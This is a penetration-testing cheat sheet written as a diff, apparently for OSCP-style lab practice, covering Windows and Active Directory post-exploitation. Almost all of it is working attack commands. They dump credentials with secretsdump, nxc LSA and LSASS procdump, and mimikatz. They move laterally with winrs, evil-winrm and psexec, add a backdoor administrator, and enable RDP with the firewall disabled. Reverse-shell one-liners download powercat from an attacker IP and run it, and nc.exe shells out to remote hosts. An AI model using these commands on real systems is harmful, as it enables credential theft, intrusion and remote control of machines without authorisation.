+===impacket-secretsdump
+#remote dumping with creds (can be used for dc-sync attack)
+impacket-secretsdump domain.oscp/administrator:password@target.pg
+#dumped system & sam files
+impacket-secretsdump -system /path/to/system-file -sam /path/to/sam-file local
+
+===hash dumping
+nxc smb files02.medtech.com -u joe -p Flowers1 --lsa
+nxc smb target.com -u user -p password -M procdump -o PROCDUMP_PATH=/serve/win/binaries/ DIR_RESULT=/home/kali/pt...
+nanodump
+handlekatz
+lsassy
+masky
+mimikatz
+
+==================================================================================
+===Pivoting===
+===WINRM
+#winrs
+winrs -r:client02 -u:wario -p:Mushroom! "cmd.exe"
+#New-PSSession
+$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+Enter-PSSession <*session-ID*>
+#Evil-WinRM
+evil-winrm -i $TARGET -u username -p password [-H hash]
+	download /source/to/file /dest/path/file
+	upload /source/to/file /dest/path/file
+	
+
+===Runas
+#runas.ps1
+Import-Module .\Invoke-RunsasCs.ps1
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.211/powercat.ps1');powercat -c 192.168.45.211 -p 80 -e cmd"
+
+#runas.exe
+.\ra.exe svc_mssql trustno1 "cmd /c c:\users\public\nc.exe 192.168.45.162 80 -e cmd"
+
+===PsExec (uses smb)
+impacket-psexec username@target.pg [-hashes hash]
+
+==================================================================================
+===Windows new user
+net user /add kali p@ssword123
+net localgroup administrators kali /add
+
+==================================================================================
+===RDP===
+===enable-rdp
+powershell
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+netsh advfirewall set allprofiles state off
+net localgroup "remote desktop users" kali /add
+
+===Enable RDP-PTH
+powershell
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
+
+===if already logged on
+powershell
+query session
+logoff 1
+
+==================================================================================
+===ReverseShells===
+===powercat
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://$LHOST:8000/powercat.ps1');powercat -c $LHOST -p 80 -e cmd"
+
